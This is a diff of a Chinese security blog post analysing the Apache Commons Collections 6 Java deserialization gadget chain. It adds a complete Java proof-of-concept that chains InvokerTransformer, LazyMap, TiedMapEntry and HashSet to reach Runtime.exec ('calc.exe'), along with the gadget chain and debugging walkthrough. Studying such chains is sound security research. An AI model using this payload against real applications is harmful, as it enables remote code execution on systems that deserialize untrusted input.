@@ -8,18 +8,28 @@
   <link rel="dns-prefetch" href="https://teaboj.github.io">
   <title>Commons Collections 6 | TeaBo’s 树洞</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这篇文章好像需要密码呢">
-<meta property="og:type" content="article">
+  <meta property="og:type" content="article">
 <meta property="og:title" content="Commons Collections 6">
 <meta property="og:url" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/index.html">
 <meta property="og:site_name" content="TeaBo’s 树洞">
-<meta property="og:description" content="这篇文章好像需要密码呢">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804150555246.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804150702211.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804150716903.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804150755641.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804150829863.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804151306971.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804151430063.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804151710007.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804151745089.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804151810446.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804151830581.png">
 <meta property="article:published_time" content="2021-08-03T06:58:22.000Z">
-<meta property="article:modified_time" content="2021-08-03T06:59:05.490Z">
+<meta property="article:modified_time" content="2021-08-04T07:22:40.935Z">
 <meta property="article:author" content="TeaBo">
 <meta property="article:tag" content="java代码审计">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://teaboj.github.io/2021/08/03/Commons-Collections-6/image-20210804150555246.png">
   
     <link rel="alternative" href="/atom.xml" title="TeaBo’s 树洞" type="application/atom+xml">
   
@@ -190,18 +200,50 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哒咩哒咩！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="3a4432a582049b1f17f8b38643578314983aca42c73052de8a1ef32133408108">e2b7d63e5d20c734d3e26178b7822f212a0d7de19feffceb0ba04b51e49c2de2</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+        <h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a><a id="more"></a>序言</h3><p>环境要求：CommonsCollections: 3.1-3.21  , java版本暂无要求</p>
+<p>CommonsCollections6是上一个CC5的改动版。</p>
+<p>CC6链中使用的是<code>HashSet</code>去触发LazyMap的get方法。而在CC5中使用的是<code>BadAttributeValueExpException</code></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//构造ChainedTransformer链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">"Teabo"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//map.remove("123");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置map属性为HashMap</span></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.HashSet"</span>).getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改key为hashset</span></span><br><span class="line">        Field table = Class.forName(<span class="string">"java.util.HashMap"</span>).getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tiedmap);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc61.bin"</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc61.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>利用链：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()          org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            ...                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在上一节讲过<code>TiedMapEntry</code>中的<code>getValue()</code>可以触发get()方法，CC5是用<code>toString()</code>来调用getValue()，这里我们换一个，用<code>hashcode()</code></p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804150555246.png" alt="image-20210804150555246"></p>
+<p>那么就来找找什么地方能调用<code>TiedMapEntry#hashcode()</code></p>
+<p>在<code>HashMap</code>找到<code>hash</code>函数，里面调用自己的<code>hashcode()</code></p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804150702211.png" alt="image-20210804150702211"></p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804150716903.png" alt="image-20210804150716903"></p>
+<p>分析过URLDNS链就应该很眼熟了,如果能控制这个key为TiedMapEntry就能连起来了</p>
+<p>正好<code>HashSet#readObject()</code>完美符合条件</p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804150755641.png" alt="image-20210804150755641"></p>
+<p>e的结果为s的readObject()，看看它序列化writeObject()</p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804150829863.png" alt="image-20210804150829863"></p>
+<p>如果我们能控制map中的Key,就能设置s，那么e也就可控了，<code>HashMap#put</code>的key也可控。</p>
+<p>所以我们需要控制传入map的<code>keySet</code>返回结果来控制变量。</p>
+<p> 再来看看POC的构造</p>
+<p>前半部分依然是和CC5一样</p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804151306971.png" alt="image-20210804151306971"></p>
+<p>但是后半部分多了一些乍一看挺复杂的步骤</p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804151430063.png" alt="image-20210804151430063"></p>
+<p>第一个红框处主要是利用反射获取我们的 <code>HashSet</code> 的 <code>map</code> 属性，因为我们要先获取到 map 才能对 map 的 key 进行修改。</p>
+<p>第二个红框处则是修改我们 HashMap 中的 key 值为 hashset，在这里利用反射获取了 HashMap 中的 table 属性，table其实就是hashmap的存储底层，将 &lt;Key,Value&gt; 封装在了 Node 对象中，在获取到了 table 中的 key 之后，利用反射修改其为 hashset。</p>
+<p><strong>最终的目的只是通过反射修改keySet的返回结果为[TiedMapEntry]而已</strong></p>
+<p>简单调试一下</p>
+<p>将TiedMapEntry作为e传入<code>hashmap.put()</code></p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804151710007.png" alt="image-20210804151710007"></p>
+<p>调用<code>TiedMapEntry#hashcode</code></p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804151745089.png" alt="image-20210804151745089"></p>
+<p>调用<code>TiedMapEntry#getValue()</code></p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804151810446.png" alt="image-20210804151810446"></p>
+<p>触发<code>LazyMap#get()</code></p>
+<p><img src="/2021/08/03/Commons-Collections-6/image-20210804151830581.png" alt="image-20210804151830581"></p>
+<p>后面的事情大家应该都懂。</p>
+
       
 
 	
@@ -275,7 +317,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#序言"><span class="toc-number">1.</span> <span class="toc-text">序言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li></ol>
                     </div>
                 </span>
             </div>
